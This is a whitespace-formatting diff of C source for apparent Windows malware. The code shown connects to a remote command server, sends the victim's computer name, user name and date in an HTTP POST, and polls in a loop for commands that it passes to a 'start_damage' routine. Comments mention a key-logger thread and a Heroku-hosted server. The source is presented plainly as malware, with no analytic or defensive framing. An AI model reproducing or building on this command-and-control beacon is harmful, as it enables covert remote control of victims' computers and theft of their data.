@@ -12,12 +12,12 @@ HANDLE thread_handle = 0; // thread handle for the Key Logger -> declared here t
 int start_socket()
 {
     WSADATA wsaData = { 0 };
-    struct sockaddr_in clientService = {0};
-    SOCKET ConnectSocket = {0};
+    struct sockaddr_in clientService = { 0 };
+    SOCKET ConnectSocket = { 0 };
     char* data = NULL;
     int iResult = 0;
 
-    
+
     // start the socket connection
     if (connect_socket(wsaData, clientService, &ConnectSocket) != 0)
     {
@@ -28,7 +28,7 @@ int start_socket()
     printf("Connected to server.\n"); // connected to the server -> with socket
 
 
-    
+
     // sends first connection packet to the server
     if (send_first_commit_packet(&ConnectSocket) != 0)
     {
@@ -43,13 +43,13 @@ int start_socket()
         return -1;
     }
     printf("socket closed correctly! \n");
-    
+
 
     printf("\n---------------------------------\n");
-    
 
-    
-    
+
+
+
     while (1)
     {
         // start the socket connection
@@ -82,12 +82,12 @@ int start_socket()
         printf("socket closed correctly! \n");
 
 
-        
+
         //if there are commands to do
         if (data != NULL)
         {
             printf("Commands to do! \n");
-            
+
             // start using the damage functions. LOL
             iResult = start_damage(data);
             if (iResult != 0)
@@ -114,7 +114,7 @@ int start_socket()
     }
 
 
-    
+
 
 
 
@@ -140,9 +140,8 @@ int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* Co
 
 
     /*
-        
-        To connect locally
 
+        To connect locally
     */
 
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -165,7 +164,6 @@ int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* Co
     clientService.sin_family = AF_INET;
     clientService.sin_addr.s_addr = inet_addr(SOCKET_IP);
     clientService.sin_port = htons(SOCKET_PORT);
-
     iResult = connect(*ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
     if (iResult == SOCKET_ERROR) {
         printf("connect function failed with error: %ld\n", WSAGetLastError());
@@ -178,14 +176,12 @@ int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* Co
 
 
     /*
-
         To connect to some heroku server
-
     */
 
 
     ////////////////////////
-    
+
     //--------------------------------
     // Setup the hints address info structure
     // which is passed to the getaddrinfo() function
@@ -214,49 +210,43 @@ int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* Co
     {
         switch (ptr->ai_family)
         {
-            case AF_INET:
-                printf("AF_INET (IPv4)\n");
-                sockaddr_ipv4 = (struct sockaddr_in*) ptr->ai_addr;
-                printf("\tIPv4 address %s\n", inet_ntoa(sockaddr_ipv4->sin_addr));
+        case AF_INET:
+            printf("AF_INET (IPv4)\n");
+            sockaddr_ipv4 = (struct sockaddr_in*) ptr->ai_addr;
+            printf("\tIPv4 address %s\n", inet_ntoa(sockaddr_ipv4->sin_addr));
 
-                strncpy(ipstringbuffer, inet_ntoa(sockaddr_ipv4->sin_addr), strlen(inet_ntoa(sockaddr_ipv4->sin_addr)));
+            strncpy(ipstringbuffer, inet_ntoa(sockaddr_ipv4->sin_addr), strlen(inet_ntoa(sockaddr_ipv4->sin_addr)));
 
-                // adding null byte in the end.
-                ipstringbuffer[strlen(inet_ntoa(sockaddr_ipv4->sin_addr))] = '\0';
+            // adding null byte in the end.
+            ipstringbuffer[strlen(inet_ntoa(sockaddr_ipv4->sin_addr))] = '\0';
 
-                printf("%s:%d \n", ipstringbuffer, sockaddr_ipv4->sin_port);
-                // if founded a good ip - try to connect.
-                clientService.sin_family = AF_INET;
-                clientService.sin_addr.s_addr = inet_addr(ipstringbuffer); // the ip
-                clientService.sin_port = (sockaddr_ipv4->sin_port); // the port
+            printf("%s:%d \n", ipstringbuffer, sockaddr_ipv4->sin_port);
+            // if founded a good ip - try to connect.
+            clientService.sin_family = AF_INET;
+            clientService.sin_addr.s_addr = inet_addr(ipstringbuffer); // the ip
+            clientService.sin_port = (sockaddr_ipv4->sin_port); // the port
 
-                // initializing the global variables for the ip and port connection to send and recv the masseges.
-                strncpy(SOCKET_IP, ipstringbuffer, sizeof(SOCKET_IP));
-                SOCKET_PORT = sockaddr_ipv4->sin_port;
+            // initializing the global variables for the ip and port connection to send and recv the masseges.
+            strncpy(SOCKET_IP, ipstringbuffer, sizeof(SOCKET_IP));
+            SOCKET_PORT = sockaddr_ipv4->sin_port;
 
-                printf("%s:%d \n", (ipstringbuffer), (sockaddr_ipv4->sin_port));
+            printf("%s:%d \n", (ipstringbuffer), (sockaddr_ipv4->sin_port));
 
-                iResult = connect(*ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
-                if (iResult == SOCKET_ERROR) {
-                    /*printf("connect function failed with error: %ld\n", WSAGetLastError());
-                    iResult = closesocket(*ConnectSocket);
-                    if (iResult == SOCKET_ERROR)
-                        printf("closesocket function failed with error: %ld\n", WSAGetLastError());
-                    WSACleanup();
-                    return -1;*/
-                    printf("Current ip and port are invalid! \n");
-                }
-                else
-                {
-                    // if founded good ip and port, and connected successfully - finish the loop.
-                    printf("Founded ip and port to connect! \n");
-                    ptr = NULL;
-                }
+            iResult = connect(*ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
+            if (iResult == SOCKET_ERROR) {
+                printf("Current ip and port are invalid! \n");
+            }
+            else
+            {
+                // if founded good ip and port, and connected successfully - finish the loop.
+                printf("Founded ip and port to connect! \n");
+                ptr = NULL;
+            }
 
-                break;
+            break;
 
-            default:
-                break;
+        default:
+            break;
         }
 
         // if connection has made - stop looking for other connections.
@@ -274,7 +264,7 @@ int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* Co
         WSACleanup();
         return -1;
     }
-    
+
     ///////////////////
 
     return 0;
@@ -308,7 +298,7 @@ int send_first_commit_packet(SOCKET* s)
     char* msg = NULL;
     char* content_added = NULL;
     char* temp_buffer = NULL;
-    char* server_response = (char*) malloc(SIZE_OF_HTTP_MSG);
+    char* server_response = (char*)malloc(SIZE_OF_HTTP_MSG);
     //char* data = (char*) malloc(SIZE_OF_DATA);
     char* data = NULL;
     int msg_response_len = 0;
@@ -316,26 +306,26 @@ int send_first_commit_packet(SOCKET* s)
 
     // getting the pc name -> global variable of the pc-name
     iResult = GetComputerNameA(pc_name, &buffer_size);
-    
+
 
     // getting the user name
     iResult = GetUserName(user_name, &buffer_size);
-    
+
     // getting the struct as the current time
     GetSystemTime(&st);
 
     temp_buffer_size = strlen("{%cpc_name%c: %c%s%c,%cuser_name%c: %c%s%c,%cday_of_month%c: %c%d%c}") + strlen(pc_name) + strlen(user_name) + sizeof(int) + 20;
 
-    temp_buffer = (char*) malloc(temp_buffer_size);
+    temp_buffer = (char*)malloc(temp_buffer_size);
 
     // content added
     content_added_size = snprintf(temp_buffer, temp_buffer_size, "{%cpc_name%c:%c%s%c,%cuser_name%c:%c%s%c,%cday_of_month%c:%c%d%c}", APOSTROPHES, APOSTROPHES, APOSTROPHES, pc_name, APOSTROPHES, APOSTROPHES, APOSTROPHES, APOSTROPHES, user_name, APOSTROPHES, APOSTROPHES, APOSTROPHES, APOSTROPHES, st.wDay, APOSTROPHES);
 
     // the real size of the content added
     content_added_size = strlen(temp_buffer);
-    
-    content_added = (char*) malloc(content_added_size + 1);
-    
+
+    content_added = (char*)malloc(content_added_size + 1);
+
     snprintf(content_added, content_added_size + 1, temp_buffer); // '+ 1' to include the last letter -> need one more space for the null byte '\0'
 
     msg_size = strlen("%s\r\nContent-Length: %d\r\nHost: %s\r\n\r\n%s") + strlen(FIRST_CONNECTION_MSG) + strlen(DOMAIN_NAME) + strlen(content_added) + 20;
@@ -345,8 +335,8 @@ int send_first_commit_packet(SOCKET* s)
 
 
     // making the full POST message
-    snprintf(msg , msg_size, "%s\r\nContent-Length: %d\r\nHost: %s\r\n\r\n%s", FIRST_CONNECTION_MSG, content_added_size, DOMAIN_NAME, content_added);
-    
+    snprintf(msg, msg_size, "%s\r\nContent-Length: %d\r\nHost: %s\r\n\r\n%s", FIRST_CONNECTION_MSG, content_added_size, DOMAIN_NAME, content_added);
+
 
 
     // sending the first connection message
@@ -362,7 +352,7 @@ int send_first_commit_packet(SOCKET* s)
         printf("Problem sending the first connection message! \n");
         return -1;
     }
-    
+
     printf("Sent first connection http packet! \n");
 
     // receiving the full message from the server
@@ -414,8 +404,8 @@ int get_command(SOCKET* s, char** return_data)
 
 
     msg_len = strlen(GET_COMMAND_MSG) + (MAX_COMPUTERNAME_LENGTH + 1) + strlen(DOMAIN_NAME);
-    
-    msg = (char*) malloc(msg_len);
+
+    msg = (char*)malloc(msg_len);
 
     msg_len = snprintf(msg, msg_len, GET_COMMAND_MSG, pc_name, DOMAIN_NAME); // fixed / real len of the full message
 
